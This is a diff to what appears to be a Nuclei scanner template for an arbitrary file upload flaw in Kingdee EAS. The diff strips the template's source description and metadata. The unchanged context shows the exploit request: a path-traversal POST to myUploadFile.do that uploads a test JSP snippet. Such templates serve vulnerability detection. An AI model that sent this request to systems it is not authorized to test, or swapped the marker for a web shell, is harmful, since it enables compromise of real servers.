@@ -3,12 +3,8 @@ info:
   name: 金蝶EAS myUploadFile接口任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ebqom7x0wo4i58xg'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ebqom7x0wo4i58xg
-    fofa: 暂无
 http:
 - raw:
   - 'POST /easportal/buffalo/%2e%2e/cm/myUploadFile.do HTTP/1.1
@@ -35,8 +31,6 @@ http:
     Content-Type: multipart/form-data; boundary=----test
 
 
-
-
     ------test
 
 
@@ -44,8 +38,6 @@ http:
 
 
     Content-Type: text/html
-
-
 
 
     <%out.println("test");%>
